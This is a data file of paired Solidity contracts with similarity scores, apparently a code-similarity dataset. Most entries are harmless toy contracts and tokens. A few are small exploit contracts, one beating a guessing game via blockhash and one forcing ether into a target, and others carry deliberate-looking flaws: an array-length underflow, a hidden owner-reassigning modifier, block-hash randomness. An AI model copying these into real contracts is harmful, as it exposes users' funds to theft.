    function balanceOf(address _owner) public returns (uint256 balance){ }

}"
"contract Base{
    uint public data1;
    bytes32 public data2;

    function setdata(uint a, bytes32 b){
        data1 = a;
        data2 = b;
    }
    function getdata() public view returns(uint){
        return data1 ;
    }

}",0.6811552966499879,"contract HashMap {
    mapping(bytes32 => bytes) map;
    
    function set(bytes _data) public {
        map[keccak256(_data)] = _data;
    }
    
    function get(bytes32 _hash) public constant returns (bytes data) {
        return map[_hash];
    }
}"
"contract MyContract {
    struct MyStruct {
        bytes32 name;
        mapping (address => uint256) balances;
    }

    Result[] public results;
}",0.624075505642761,"contract token {
  mapping (address => uint256) public balanceOf;
  function transfer(address _to, uint256 _value) external;
}"
"contract RegProvider { 
address[] public registrators_contracts; 
address[] public counters_contracts; 


event EventReg(address useraddr); 
event EventTick(address useraddr, uint chislo); 
event EventRemove(address useraddr); 

function getRegistratorsContractCount() 
public 
returns(uint contractCount) 
{ 
return registrators_contracts.length; 
} 

function getCountersContractCount() 
public
returns(uint contractCount) 
{ 
return counters_contracts.length; 
} 

function NotifyRegister(address client) 
public 
{ 
EventReg(client); 
} 

function NotifyGetTick(address client, uint chislo) 
public 
{ 
EventTick(client, chislo); 
} 

function NotifyRemove(address client) 
public 
{ 
EventRemove(client); 
} 

function newRegistratorCounterPair() 
public 
{ 
Registrator reg = new Registrator(); 
registrators_contracts.push(reg); 
Counter cnt = new Counter(); 
counters_contracts.push(cnt); 
reg.set_counter_addr(cnt); 
reg.set_provider_addr(this); 
cnt.set_registrator_addr(reg); 
cnt.set_provider_addr(this); 
} 
}",0.6043795191403165,"contract DigitalDollarRetainerFactory {


mapping (address => bool) public validContracts;
address[] public contracts;


function getContractCount()
public
view
returns(uint contractCount)
{
return contracts.length;
}


function getDeployedContracts() public view returns (address[])
{
return contracts;
}


function newDigitalRetainer(string _terms, address _client, address _provider, string _deliverable, string _governingLawandForum, uint8 _retainerDurationinDays, uint8 _deliverableRate, uint8 _payCap)
public
returns(address)
{
DigitalDollarRetainer c = new DigitalDollarRetainer(_terms, _client, _provider, _deliverable, _governingLawandForum, _retainerDurationinDays, _deliverableRate, _payCap);
validContracts[c] = true;
contracts.push(c);
return c;
}


function getTerms(address ddRetainer)
public
view
returns(string)
{


require(validContracts[ddRetainer],""Contract Not Found!"");

return (DigitalDollarRetainer(ddRetainer).getTerms());
}
}"
"contract Puzzle {
     address payable public owner ;
     bool public locked ;
     uint public reward ;
     bytes32 public diff ;
     bytes public solution ;


    constructor () public {
       owner = msg.sender ;
       reward = msg.value ;
       locked = false ;
       diff = bytes32 (11111); 
    }",0.6170980634754094,"contract Stoppable is Ownable {

    bool public stopped;

    

    constructor() public {

        stopped = false;

    }

    

    modifier stoppable() {

        if (stopped) {

            revert();

        }

        _;

    }

    

    function stop() public onlyOwner {

        stopped = true;

    }

    

    function start() public onlyOwner {

        stopped = false;

    }

}"
"contract Operations {

    Operation[] public operations;

    struct Operation {
        uint startOperation;
        uint endOperation;
        string responsible; 
        string opType;
    }

    function getAllOperations() public view returns(Operation[] memory){
        return operations;
    }
}",0.6087068503934893,"contract UpgradeabilityStorage {

  

    string internal _version;



    

    address internal _implementation;



    

    function version() public view returns (string) {

        return _version;

    }



    

    function implementation() public view returns (address) {

        return _implementation;

    }

}"
"contract B is A{

   function doSomething(){
       require(msg.sender == owner);
       
       super.doSomething();
   }

}",0.6100206154919867,"contract Mortal is Owned {
    
    function kill() {
        if (msg.sender == owner)
            selfdestruct(owner);
    }
}"
"contract Score {
    unit24[]score;

    function addScore(unit24 s) public returens(unit24 []memory){
        score.push(s);
        return score;
    }

    function getLength()view public returens(unit){
        return score.length;
    }

    function clearArray() public returens(unit24 [] memory){
        delete score;
        return score;
    }
}",0.6036649602143137,"contract ERC20Interface {
  function name() public view returns (string memory);
  function symbol() public view returns (string memory);
  function decimals() public view returns (uint8);
  function balanceOf(address _owner) public view returns (uint256 balance);
}"
"contract Test {
    uint public sum;
    function makeRequest(){
      sum += msg.value;
    }
}",0.6243852777148324,"contract ERC20 {

  function transfer(address to, uint value) public;

}"
"contract test {
  bytes32 public Date;

  function test(bytes32 _date){
      Date=_date; 
  }
}",0.6310738294395182,"contract IRandomUtil{

    function getRandom(bytes32 param) public returns (bytes32);

}"
"contract Demo2{

    address public owner = msg.sender;
    address[] user;
    address Bank1;

    constructor (string _ID ,address _addr ) {
    }
}",0.6332724144659252,"contract OOOOOO {
    address public owner;
	
    constructor() public {
        owner = msg.sender;
    }

	modifier restricted {
        require(msg.sender == owner);
        _;
    }
	
}"
"contract ArrayOverflow{
    uint256 public target = 10;
    uint256[] public array = [9,8];

    function modifyArray (uint256 _index, uint256 _value){
        array[_index] = _value;
    }

    function popLength() public{
        
        array.length--;
    }

    function getLength() constant returns(uint256){
        return array.length;
    }

}",0.6751690777630354,"contract Growth {

  uint256 public totalSupply;

  function balanceOf(address who) public constant returns (uint256);

  function transfer(address to, uint256 value) public returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

}"
"contract basics{
    using SafeMath for *;
    uint time;
    address payable sender;
    uint amount;
    event moneySent(address s,uint a);

    mapping(address=>person) public accounts;

    struct person {
        uint time;
        uint vault;
    }        

    function sendToContract() public payable{
        accounts[msg.sender].vault=accounts[msg.sender].vault.add(msg.value);
        accounts[msg.sender].time=now;
    }

    function takeFromContract() public payable{
        if(now>=accounts[msg.sender].time+10 seconds){
            msg.sender.transfer(accounts[msg.sender].vault);
            accounts[msg.sender].time=now;
        }           
    }
}",0.6117349252842874,"contract hodlEthereum {
    event Hodl(address indexed hodler, uint indexed amount);
    event Party(address indexed hodler, uint indexed amount);
    mapping (address => uint) public hodlers;
    uint constant partyTime = 1596067200; 
    function() payable {
        hodlers[msg.sender] += msg.value;
        Hodl(msg.sender, msg.value);
    }
    function party() {
        require (block.timestamp > partyTime && hodlers[msg.sender] > 0);
        uint value = hodlers[msg.sender];
        hodlers[msg.sender] = 0;
        msg.sender.transfer(value);
        Party(msg.sender, value);
    }
}"
"contract GLDToken is ERC20 {
    constructor(uint256 initialSupply) ERC20(""Gold"", ""GLD"") public {
        _mint(msg.sender, initialSupply);
    }
}",0.6247228748492658,"contract LFGToken is ERC20 {
    constructor() ERC20(""Alphabets"", ""LFG"") public {
        _mint(msg.sender, 100000000000000000000000000);
    }
}"
"contract Passport
{
    struct      Person
    {
        string  name;
        string  surname;
        uint8   age;
        uint256 id;
        bool    registered;
    }

    address payable public              owner;
    mapping(address => Person) public   people;
    uint256                             idCount;

    modifier ownerOnly()
    {
        require(msg.sender == owner);
        _;
    }

    constructor() public payable
    {
        owner = msg.sender;
    }

    function registerID(string memory _name, string memory _surname, uint8 _age) public
    {
        require(!people[msg.sender].registered);

        people[msg.sender].name = _name;
        people[msg.sender].surname = _surname;
        people[msg.sender].age = _age;
        people[msg.sender].id = idCount;

        people[msg.sender].registered = true;

        idCount += 1;
    }

    
    function isRegistered(address _address) public view returns (bool)
    {
        return people[_address].registered;
    }

    function end() ownerOnly public
    {
        selfdestruct(owner);
    }
}",0.6599616393180662,"contract PrivateBet {



     

    event NewBet(address indexed _address);

    

     

    uint8 private paused = 0;



     

    uint private price;

    

     

    bytes16 private name;

    

     

    address private owner;



     

    address[] public users;

    

    

    constructor(bytes16 _name, uint _price) public {

        owner = msg.sender;

        name = _name;

        price = _price;

    }

    

    

    function() public payable {

        

        

        require(paused == 0, 'paused');

        

        

        require(tx.origin == msg.sender, 'not allowed');

        

        

        require(msg.value >= price, 'low amount');



        

        users.push(msg.sender);

        

        

        emit NewBet(msg.sender);

         

         

        owner.transfer(msg.value);

    }

    

    

    function details() public view returns (

        address _owner

        , bytes16 _name 

        , uint _price 

        , uint _total

        , uint _paused

        ) {

        return (

            owner

            , name

            , price

            , users.length

            , paused

        );

    }

    

    

    function pause() public {

        

        require(msg.sender == owner, 'not allowed');

        

        paused = 1;

    }

}"
"contract Example{
    function greet(){
        revert(""Hello World"");        
    }
}",0.620340737514306,"contract Nonpayable {

  
  
  
  function () public payable {
    revert();
  }
}"
"contract GuessTheNumberChallenge {
    constructor() public payable {
        require(msg.value == 1 ether);
    }

}",0.672524718885452,"contract Attack {

    constructor(address to) public payable {

        require(to.call.value(msg.value)());

    }

}"
"contract SEexample {

    int256[3] thing;
    uint8 internal i=0;

    function submit(int256[3] bids,int256[3] prefs) public returns (int256[3]){
            for (i=0;i<3;i++){
                thing[i] = bids[i] + prefs[i];
            }
        return thing;
    }
}",0.6016534015683097,"contract SuperCountriesExternal {

  using SafeMath for uint256; 



	function ownerOf(uint256) public pure returns (address) {	}

	

	function priceOf(uint256) public pure returns (uint256) { }

}"
"contract z3 is z1  {


    function z3 (){}

    function getZ3example() returns(uint){
        return (z1.getZ1example());
    }


}",0.6398293578288374,"contract TimeAware is Ownable {



    

    function getTime() public view returns (uint) {

        return now;

    }



}"
"contract Greet
    {
  string message;
  constructor() public
  {
    message = ""I'm ready!"";

}
function setgreetings(string _message)public
{
    message = _message;

}
function getgreetings()public constant returns(string)
{
    return message;
}
}",0.6714024126761127,"contract Hello {

    string greeting;



     constructor() public {

        greeting = ""hello"";

     }



     function getGreeting() public view returns (string) {

        return greeting;

     }



     function setGreeting(string _greeting) public {

        greeting = _greeting;

     }

}"
"contract CB
{
    function FB() public
    {
        
    }

    function FC() public
    {
       
    }
}",0.646274203102004,"contract Incrementer {
    uint public i;
    function inc() {
        i++;
    }
}"
"contract test{

uint average;
uint counter;

function calcAverage( uint _newValue) public
{
    average = ((average * counter) + _newValue)/(counter + 1);
}

function get() public view returns(uint)
{
    return average;
}
}",0.6787837444489686,"contract Counter {
    uint256 count;  

    function Counter(uint256 _count) public {
        count = _count;
    }

    function increment() public {
        count += 1;
    }

    function getCount() public view returns (uint256) {
        return count;
    }
}"
"contract Marketplace {
    string public name;
    address owner;
    uint public fileCount = 0;
    mapping(uint => File) public files; 


    struct File
    {
        uint id;
        string name;
        address owner;
        address sharedWith;
    }

    event FileViewed(
        uint id,
        string name,
        address owner,
        address sharedWith
    );

    constructor() public {
        name = ""File Sharing System"";
        owner = msg.sender;
    }

    function viewFile(uint _id) public 
    {
        File memory _file = files[_id];
        require(msg.sender==_file.sharedWith || msg.sender==owner ,""Not shared with you!!"");
        emit FileViewed(fileCount, _file.name, owner, _file.sharedWith);
    }
}",0.6112334987242437,"contract IOU {
    address owner;


    string public name;
    string public symbol;
    uint8 public decimals;
    

    mapping (address => uint256) public balanceOf;


event Transfer(address indexed from, address indexed to, uint256 value);

    function IOU(string tokenName, string tokenSymbol, uint8 decimalUnits) {
        owner = msg.sender;                                 
        name = tokenName;                                       
        symbol = tokenSymbol;                                     
        decimals = decimalUnits;                                       
    
    }
    
    
    function transfer(address _from, address _to, uint256 _value) {
        if(msg.sender != owner) throw;                       
        balanceOf[_from] -= _value;                     
        balanceOf[_to] += _value;                            
        Transfer(msg.sender, _to, _value);                   
    }
    
}"
"contract MyCollectable is ERC721Full {

constructor (string memory _name, string memory _symbol) public
    ERC721Full(_name, _symbol) {
}



function mintUniqueTokenTo(address _to, uint256 _tokenId, string memory _tokenURI)  
    public {
        super._mint(_to, _tokenId);
        super._setTokenURI(_tokenId, _tokenURI);
    }
}",0.6303212561822713,"contract ERC20Token is BaseERC20Token {



    string public builtOn = ""Ethereum Blockchain Network"";



    constructor(

        string memory name,

        string memory symbol,

        uint8 decimals,

        uint256 cap,

        uint256 initialSupply

    )

        public

        BaseERC20Token(name, symbol, decimals, cap, initialSupply)

    {} 

}"
"contract ChildContract{
    bool isActive;

    constructor() public{
        isActive = true;
    }

    function activate(bool status) public{
        isActive = status;
    }
}",0.6219255723385422,"contract Etx is ERC20Interface {
    uint256 public expirationBlock;
    function isActive(address _owner) public returns (bool activated);
}"
"contract waterBill{
    address admin;
    uint public rateperliter;
    struct Individual{
        string name;
        string addr;
        uint water;
        uint BillAmount;
    }
    mapping (address=>Individual) individual;
    address[] Useraccts;
    constructor() public{
        admin=msg.sender;
    }
    modifier onlyAdmin(){
        require(msg.sender==admin,""Only Admin has access to this function"");_;
    }
     event NewUser(
         string _name,
         address _address,
         uint _waterconsumed
         );
     event BillGenerated(
         address _address,
      uint billamount
         );
    function setUser(string memory _name,address _address,uint _waterconsumed,string memory _Physicaladdress) public onlyAdmin()
    {
        Individual memory User=individual[_address];
        User.name=_name;
        User.water=_waterconsumed;
        User.addr=_Physicaladdress;
        Useraccts.push(_address) -1;
    emit NewUser(_name,_address,_waterconsumed);
     }
     function setBill(address _address) public onlyAdmin() returns(uint){
         individual[_address].BillAmount=individual[_address].water*rateperliter;

    emit BillGenerated(_address,individual[_address].BillAmount);
       return individual[_address].BillAmount;
   }
    function getBill(address _address) view public returns(uint){
        return individual[_address].BillAmount;
    }
    function setRate(uint _rate) public onlyAdmin(){
        rateperliter=_rate;
    }
}",0.6377130056582598,"contract AdminRole {
  using Roles for Roles.Role;
  using ArrayUtils for address[];

  event AdminAdded(address indexed account);
  event AdminRemoved(address indexed account);

  Roles.Role private _admins;
  address[] private _addresses; 

  constructor () internal {
    _addAdmin(msg.sender);
  }

  modifier onlyAdmin() {
    require(isAdmin(msg.sender), ""AdminRole: caller does not have the Admin role"");
    _;
  }

  function addAdmin(address account) public onlyAdmin {
    _addAdmin(account);
  }

  
  function removeAdmin(address account) public onlyAdmin {
    require(_addresses.length > 1, ""AdminRole should not be 0""); 
    _removeAdmin(account);
  }

  function renounceAdmin() public {
    require(_addresses.length > 1, ""AdminRole should not be 0""); 
    _removeAdmin(msg.sender);
  }

  
  function getAdmin() public view onlyAdmin returns (address[] memory) {
    return _addresses;
  }

  function isAdmin(address account) internal view returns (bool) {
    return _admins.has(account);
  }

  function _addAdmin(address account) internal {
    _admins.add(account);
    _addresses.push(account); 
    emit AdminAdded(account);
  }

  function _removeAdmin(address account) internal {
    _admins.remove(account);
    _addresses = _addresses.remove(account); 
    emit AdminRemoved(account);
  }
}"
"contract A {
  uint public a1;
}",0.6300638562884109,"contract MSD6 {

    

    function() public {

        

    }

}"
"contract Attack {
    Guess g;
    event LogSuccess(address sender, bool success);
    constructor(address guessIt) public {
        g = Guess(guessIt);
    }
    function notSoHardAfterAll() public {
        if(g.guessMe(uint(blockhash(block.number)))) {
            emit LogSuccess(msg.sender, true);
        }
    }
}",0.6247166439997326,"contract Test {

    event testLog(address indexed account, uint amount);

    

    constructor() public {

        emit testLog(msg.sender, block.number);

    }

    

    function execute(uint number) public returns (bool) {

        emit testLog(msg.sender, number);

        return true;

    }

}"
"contract Echo {
    bytes32 public message;

    function sendMessage(bytes32 _message) public {
        message = _message;
    }

    function getMessage() view public returns (bytes32) {
        return message;
    }
}",0.6624820473581486,"contract Bulletin {
    
    string public message = """";
    address public owner;
    
    function Bulletin(){
        owner = msg.sender;
    }
    
    function setMessage(string _message){
        require(msg.sender == owner);
        message = _message;
    }
}"
"contract Revoke {

    mapping(string => bool) validities;

    function store(string memory hash) public {
        validities[hash] = true;
    }

    function revoke(string memory hash) public {
        validities[hash] = false;
    }

    function isValid(string memory hash) public view returns (bool) {
        return validities[hash];
    }
}",0.6197256057649455,"contract DocumentHash {

    mapping(string => uint) hashToBlockNumber;



    function write(string memory hash) public {

        

        require(hashToBlockNumber[hash] == 0);



        hashToBlockNumber[hash] = block.number;

    }



    function getBlockNumber(string memory hash) public view returns(uint) {

        return hashToBlockNumber[hash];

    }

}"
"contract C {
  uint u;
  function f() {
    u = 1;
  }
}",0.6152396343510456,"contract FLC {
    function create(uint units) public;
}"
"contract B is C {
  function f() {
    u = 2;
  }
}",0.6216783372562777,"contract test {
    function f() public { }
}"
"contract C {
    ERC20 token = ERC20(0x...);
    address ownerOfFoo;

    function buyFoo(address owner) external {
        require(ownerOfFoo == address(0), ""already owned"");
        require(token.transferFrom(msg.sender, address(this), 1000), ""foo costs 1,000 token units"");

        ownerOfFoo = owner;
    }
}",0.6194247883774703,"contract Ownable {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function Ownable() public {
        owner = msg.sender; 
    }

    
    function transferTo(address _to) public onlyOwner returns (bool) {
        require(_to != address(0));
        owner = _to;
        return true;
    } 
}"
"contract stringsContract {

    function takesTwo(string memory str, uint idx) public pure returns (bytes memory) {
        bytes memory bytesStr = bytes(str);
        return bytesStr;
    }
}",0.6205897425357823,"contract Validator {

    function verify(bytes32 r, bytes32 s, uint8 v, bytes32 messageHash) public pure returns (address) {

        return ecrecover(messageHash, v, r, s);

    }

}"
"contract CrowdFunding {

    struct Investor {

        address addr;

        uint amount;
 }

address public owner;

uint public numInvestors;

uint public _starting;
uint public deadline;
uint public _current;

string public status;

bool public ended;
uint public goalAmount;
uint public totalAmount;

mapping (uint => Investor) public Investors;

modifier onlyOwner () {     
    require(msg.sender == owner, ""Not owner"");
    _;
}

modifier notEnded () {
    require (!ended, ""Crowfunding ended."");
    _;
}

modifier deadlineReached () {
    require (now >= deadline, ""Crowfunding still running."");
    _;
}

constructor(uint _duration, uint _goalAmount) public {

    owner = msg.sender;

    _starting = now;
    deadline = _starting + _duration;

    goalAmount = _goalAmount;

    status = ""Funding"";

    ended = false;

    numInvestors = 0;

    totalAmount = 0;
}

function fund() public payable notEnded {

    Investor storage inv = Investors[numInvestors++];

    inv.addr = msg.sender;

    inv.amount = msg.value;

    totalAmount += inv.amount;

}


function checkGoalReached () public onlyOwner notEnded deadlineReached {

    if(totalAmount >= goalAmount) {

        status = ""Campaign Succeeded"";
        ended = true;

        
        require(owner.send(address(this).balance),""Not able to send funds to owner.""); 

        return;

    }   

    status = ""Campaign Failed"";
    ended = true;

    for(uint i = 0; i <= numInvestors; i++) {

        require(Investors[i].addr.send(Investors[i].amount));  

      } 
}

    function kill() public onlyOwner {

        selfdestruct(owner);

    }

}",0.645111938934988,"contract SecureDeposit is TokenVault {
    
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);

    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;

    function initWallet() payable open {
        Owner = msg.sender;
        minDeposit = 1 ether;
        Locked = false;
        deposit();
    }
    
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }

    function() public payable { deposit(); }

    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }

    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }

    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }

    function lock() public { Locked = true; } address owner;
    modifier open { if (!Locked) _; owner = msg.sender; }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}"
"contract Garbage {
    address[3] public addresses;
    uint idx;

    function addAddress(address _address) public {
        require(idx < addresses.length);

        addresses[idx] = _address;
        idx++;
    }
}",0.6368464099103608,"contract Utils {
    function Utils() internal {
    }

    modifier validAddress(address _address) {
        require(_address != 0x0);
        _;
    }

    modifier notThis(address _address) {
        require(_address != address(this));
        _;
    }
}"
"contract feeBurningToken is ERC20Token {
  using SafeMath for uint;
  uint256 constant PRECISION = 10 ** 3;
  mapping(address => uint256) unpaidPreciseFees; 

  function transfer(address to, uint256 amount) {
    uint256 fee = feesToBurn(amount);
    super.transfer(bonfire, fee);
    super.transfer(to, amount - fee);
  }

  function transferFrom(address from, address to, uint256 amount) {
    uint256 fee = feesToBurn(amount);
    super.transferFrom(from, bonfire, fee);
    super.transferFrom(from, to, amount - fee);

  }

  function feesToBurn(uint256 amount) public returns (uint256 fee){

    uint256 fee = amount / 100;

    uint256 preciseFee = amount.mul(PRECISION) / 100;

    unpaidPreciseFees[destination] += preciseFee.mod(PRECISION);




    if (unpaidPreciseFees[destination] >= PRECISION) {
      unpaidPreciseFees[destination] -= PRECISION;
      fee++;
    }
    return fee;
  }
}",0.600518086226865,"contract BasicToken is ERC20Basic {

    using SafeMathUint256 for uint256;



    uint256 internal supply;

    mapping(address => uint256) internal balances;



    

    function transfer(address _to, uint256 _value) public returns(bool) {

        return internalTransfer(msg.sender, _to, _value);

    }



    

    function internalTransfer(address _from, address _to, uint256 _value) internal returns (bool) {

        balances[_from] = balances[_from].sub(_value);

        balances[_to] = balances[_to].add(_value);

        Transfer(_from, _to, _value);

        onTokenTransfer(_from, _to, _value);

        return true;

    }



    

    function balanceOf(address _owner) public view returns (uint256) {

        return balances[_owner];

    }



    function totalSupply() public view returns (uint256) {

        return supply;

    }



    

    function onTokenTransfer(address _from, address _to, uint256 _value) internal returns (bool);

}"
"contract Test is owned {
    function freezeAccount(address target, bool freeze) onlyowner {
       
    }
}",0.6199025084561263,"contract mortal is owned {
    function mortal() { 
    }

    function kill() onlyOwner {
        selfdestruct(_owner);
    }
}"
"contract C {
    string constant text = ""abc"";

    function getMystr() constant returns (string) {
        return mystr;
    }
}",0.6899118097149957,"contract PublicResolver {
    function text(bytes32 node, string key) constant returns (string ret) {
    }
}"
"contract contractB {
  address tracker_0x_address = 0xd26114cd6EE289AccF82350c8d8487fedB8A0C07; 
  mapping ( address => uint256 ) public balances;

  function deposit(uint tokens) public {

    
    balances[msg.sender]+= tokens;

    
    ERC20(tracker_0x_address).transferFrom(msg.sender, address(this), tokens);
  }

  function returnTokens() public {
    balances[msg.sender] = 0;
    ERC20(tracker_0x_address).transfer(msg.sender, balances[msg.sender]);
  }

}",0.6252364073907175,"contract BasicToken is ERC20Basic {

  using SafeMath for uint256;

  mapping(address => uint256) balances;

  function transfer(address _to, uint256 _value) public {

    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    Transfer(msg.sender, _to, _value);

  }

  function balanceOf(address _owner) public returns (uint256 balance) {

    return balances[_owner];

  }

}"
"contract SimpleReturn {
    bool value = false;

    function get() public constant returns (bool) {
      return value;
    }
  }",0.6804706712845175,"contract Test {

    function A() public pure returns (bool) {

        require(false, ""you shall not pass"");

        return true;

    }

}"
"contract TestArray {
    mapping(uint => uint[]) users;

    function addUser(uint _id, uint[] memory _users) public {
        users[_id] = _users;   
    }

    function getUsers(uint _id) public view returns(uint[] memory){
        return users[_id];
    }

    function emptyUsers(uint _id) public {
        uint[] memory empty;
        users[_id] = empty;
        
        
    }
}",0.6105635312927579,"contract ERC20Basic {
  function totalSupply() public view returns (uint);
  function balanceOf(address who) public view returns (uint);
  function transfer(address to, uint value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint value);
}"
"contract TwoStructs {
    struct A {
        address[] count;
    }
    struct B {
        uint8[] count;
    }

    mapping (address => A) a;
    mapping (address => B) b;

    function add(address c, uint8 g) {
        a[msg.sender].count.push(c);
        b[msg.sender].count.push(g);
    }

    function get1(address sender) constant returns (address, uint8) {
        return (a[sender].count[0], b[sender].count[0]);
    }

    function get2() constant returns (address, uint8) {
        return (a[msg.sender].count[0], b[msg.sender].count[0]);
    }

    function getMsgSender() constant returns (address) {
        return msg.sender;
    }
}",0.647663413989268,"contract Whitelist {
    address public owner;

    address public sale;

    mapping (address => uint) public accepted;

    function Whitelist(address _owner, address _sale) {
        owner = _owner;
        sale = _sale;
    }

    function accept(address a, uint amountInWei) {
        assert(msg.sender == owner || msg.sender == sale);

        accepted[a] = amountInWei * 10 ** 18;
    }

    function setSale(address sale_) {
        assert(msg.sender == owner);

        sale = sale_;
    }

    function getCap(address _user) constant returns (uint) {
        uint cap = accepted[_user];
        return cap;
    }
}"
"contract test3 {
    constructor(address[] memory _user_addresses) public {
        usersAddresses = _user_addresses;
    }

    struct User {
        string name; 
        uint tokens;
        bool isValid;
    }

    mapping(address => User) users;
    address[] public usersAddresses;

    function checkUser(address _user_address) public returns(uint) {
        return users[_user_address].tokens;
    }

    function freeTokens() public {
       uint reciversLength = usersAddresses.length;
       for (uint i = 0; i < reciversLength; i++) {
           User storage theUser = users[usersAddresses[i]];
           theUser.tokens += 10000;
       }
    }

    function freeTokensSingle(address _user_address) public {
       User storage theUser = users[_user_address];
       theUser.tokens += 10000;
    }
}",0.6705461451611914,"contract BigbomPrivateSaleList is Ownable {
    mapping(address=>uint) public addressCap;

    function BigbomPrivateSaleList() public  {}

    event ListAddress( address _user, uint _amount, uint _time );

    
    
    function listAddress( address _user, uint _amount ) public onlyOwner {
        require(_user != address(0x0));

        addressCap[_user] = _amount;
        ListAddress( _user, _amount, now );
    }

    
    function listAddresses( address[] _users, uint[] _amount ) public onlyOwner {
        require(_users.length == _amount.length );
        for( uint i = 0 ; i < _users.length ; i++ ) {
            listAddress( _users[i], _amount[i] );
        }
    }

    function getCap( address _user ) public constant returns(uint) {
        return addressCap[_user];
    }

}"
"contract C2 {
    function() external payable {
        if (C1(msg.sender).getBoolValue()) { ... }
    }
}",0.6967264905814612,"contract SendBack {
    function() payable {
        if (!msg.sender.send(msg.value))
            throw;
    }
}"
"contract Signed1 {
    uint val = 0;
    mapping (address => bool) transferred;

    function withdrawOnce(int amount) public returns (uint) {
        require(amount > 0, 'only postive amount');
        require(transferred[msg.sender] == false, 'withdraw only once');
        transferred[msg.sender] = true;
        msg.sender.transfer(uint(amount));
    }

}",0.6450721272600307,"contract jvCoin {
    mapping (address => uint) balances;

    function jvCoin() { 
        balances[msg.sender] = 10000;
    }

    function sendCoin(address receiver, uint amount) returns (bool sufficient) {
        if (balances[msg.sender] < amount) return false;

        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        return true;
    }
}"
"contract NewHello {

    mapping(address => string) public users; 

    function updateUser(string memory name) public {
        require(keccak256(abi.encodePacked(name)) != keccak256(abi.encodePacked(users[msg.sender])));
        users[msg.sender] = name; 
    }

    function getUser(address userAddress) public view returns(string memory) {
        return users[userAddress]; 
    }
}",0.6107084764852406,"contract ConsensysAcademy{
    mapping(address=>bytes32) public names;
    address[] public addresses;
    
    modifier onlyUnique(){
        if(names[msg.sender] == 0){ _; }else{ throw; }
    }
    function register(bytes32 name) onlyUnique{
        names[msg.sender] = name; 
        addresses.push(msg.sender);
    }
    function getAddresses() returns(address[]){ return addresses; }
}"
"contract BaseContract is IBaseContract {
    function func(uint _x) external view returns (bool) {
        return _x == 1;
    }
}",0.6476727147737504,"contract InkPay is InkOwner {

  function authorizeTransaction(uint256 , address ) external returns (bool) {

    return true;

  }

}"
"contract A {
    function deployB() public payable returns (address) {
        B instance = (new B).value(msg.value)(42); 
        return instance;
    }
}",0.6445333506503844,"contract Context {
    
    
    constructor () internal { }
    

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}"
"contract B {
    uint public num;
    constructor(uint _num) public payable {
        require(msg.value > 0); 
        num = _num; 
    }
}",0.609940171343456,"contract InstaTrade is Swap {



    uint public version;

    

    

    constructor(uint _version) public {

        version = _version;

    }



}"
"contract Contract_B {

    address public c_addr;
  uint public val;
  function Contract_B(){
   val=7;}
   function change(){
   val+=90;}

   function create() {

    Contract_C cc = new Contract_C();
    c_addr = address(cc); 

   }
}",0.6270216435551493,"contract ReferContractInterface {
    function decrement(address _who) public;
    function mint(address _to, uint _value) public;
    function getBalance(address _who) public view returns(uint);
}"
"contract Test {
  address[] a;
  address[] b;

  function testFeature() {
    
  }
}",0.6602685185525639,"contract PosRewards {
    function transfer(address _from, address _to);
}"
"contract A {
function sendtoken() payable returns(bool) {
      require(msg.value!=0);
      owner.transfer(msg.value);
      balances[msg.sender]+= 1;
      balances[owner]-= 1;
      return true;
 }
}",0.6200358784843489,"contract Ownable {

    address public Owner = msg.sender;

    function isOwner() returns (bool) {

        if (Owner == msg.sender) return true; return false;

    }

}"
"contract random {
    
    function randomGen(uint seed) constant returns (uint randomNumber) {
        return(uint(sha3(block.blockhash(block.number-1), seed ))%100);
    }

    
    function multiBlockRandomGen(uint seed, uint size) constant returns (uint randomNumber) {
        uint n = 0;
        for (uint i = 0; i < size; i++){
            if (uint(sha3(block.blockhash(block.number-i-1), seed ))%2==0)
                n += 2**i;
        }
        return n;
    }
}",0.6134016939680816,"contract Random {

    uint256 _seed;



    function _rand() internal returns (uint256) {

        _seed = uint256(keccak256(abi.encodePacked(_seed, blockhash(block.number - 1), block.coinbase, block.difficulty)));

        return _seed;

    }



    function _randBySeed(uint256 _outSeed) internal view returns (uint256) {

        return uint256(keccak256(abi.encodePacked(_outSeed, blockhash(block.number - 1), block.coinbase, block.difficulty)));

    }

}"
"contract Demo {
    address public user;
    uint public i = 0;

    function Demo() {
        user=msg.sender;
    }

    address[10] users;
    bytes32[10] name;

    function add(bytes32 _name) {
        users[i] = user;
        name[i] = _name;
        i++;
    }

    function get_names() constant returns(bytes32[10]) {
        return name;
    }

    function get_address() constant returns(address[10]) {
        return users;
    }
}",0.6707449976158456,"contract ReverseRegistrar {
    function setName(string memory name) public returns (bytes32 node);
    function claim(address owner) public returns (bytes32 node);
    function claimWithResolver(address owner, address resolver) public returns (bytes32 node);
    function node(address addr) public pure returns (bytes32);
}"
"contract Holdem {

    mapping(address => uint) public balances;

    event LogDeposit(address sender, uint amount);
    event LogWithdrawal(address receiver, uint amount);
    event LogTransfer(address sender, address receiver, uint amount);

    function depost() public payable {
        balances[msg.sender] += msg.value;
        emit LogDeposit(msg.sender, msg.value);
    }

    function withdraw(uint amount) public {
        uint bal = balances[msg.sender];
        require(bal >= amount, ""Insufficient Funds."");
        balances[msg.sender] -= amount;
        emit LogWithdrawal(msg.sender, amount);
        msg.sender.transfer(amount);
    }

    function transfer(uint amount, address receiver) public {
        uint bal = balances[msg.sender];
        require(bal >= amount, ""Insufficient Funds."");
